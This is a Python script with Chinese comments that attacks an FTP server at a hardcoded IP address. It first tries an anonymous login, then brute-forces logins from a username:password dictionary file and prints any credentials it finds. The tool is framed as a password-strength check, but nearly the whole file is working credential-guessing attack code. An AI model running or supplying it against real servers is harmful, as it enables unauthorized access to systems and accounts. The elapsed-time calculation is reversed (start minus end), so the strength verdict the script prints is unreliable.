#!/usr/bin/env python
# -*- coding:utf-8 -*-

import time
import ftplib

HOSTNAME = '111.230.204.215'
PWDFILE = 'userPassword.txt'
# PWDFILE = 'test.txt'
PASSWORD_STRONG_TIME = 60*60*6 #6个小时

#匿名登录扫描
def anonScan(hostname):                 #参数是主机名
    print('正在尝试匿名登录。。')
    try:
        ftp = ftplib.FTP(hostname)    #创建Ftp对象
        ftp.login()                 #Ftp匿名登录
        print('[*] ' + str(hostname) + " 匿名登录成功") #不抛出异常则表明登录成功
        return True
    except Exception as e:              #抛出异常则表明匿名登录失败
        print('[-] ' + str(hostname) + " 匿名登录失败!")
        return False

#暴力破解
def vlcLogin(hostname, pwdFile):                #参数(主机名，字典文件)
    try:
        with open(pwdFile, 'r') as pf:          #打开字典文件
            for line in pf.readlines():         #循环读取字典文件中的每一行
                start_time = int(time.time())
                # time.sleep(1)                   #等待1秒
                userName = line.split(':')[0]   #从读取的内容中取出用户名
                passWord = line.split(':')[1].strip('\r').strip('\n') #从读取的内容中取出密码
                print('[+] Trying: ' + userName + ':' + passWord)
                try:
                    # with FTP(hostname) as ftp:  #以主机名为参数构造Ftp对象
                    ftp = ftplib.FTP(hostname)
                    ftp.login(userName, passWord)   #使用读取出的用户名密码登录Ftp服务器
                    #如果没有产生异常则表示登录成功，打印主机名、用户名和密码
                    print('[+] ' + str(hostname) + ' FTP 登录成功: '+  userName + ':' + passWord)
                    end_time = int(time.time())
                    use_time = start_time - end_time
                    return (userName, passWord,use_time)
                except Exception as e:
                    # 产生异常表示没有登录成功，这里我们不用管它，继续尝试其他用户名、密码
                    pass
    except IOError as e:
        print('Error: 字典文件不存在！')
    print('[-] 该字典没有符合的账号密码，请更换字典')
    return (None,None,None)


if __name__ == '__main__':
    if anonScan(HOSTNAME):
        pass
    else:
        print('正在暴力破解。。。')
        userName, passWord, use_time = vlcLogin(HOSTNAME,PWDFILE)
        if userName:
            if use_time > PASSWORD_STRONG_TIME:
                print('密码强度较高，破解时间为：'+str(int(use_time/60))+' 分钟')
            else:
                print('密码强度较弱，请更换密码，破解时间为：'+str(use_time/60)+' 分钟')
        else:
            print('密码强度较高，未破解')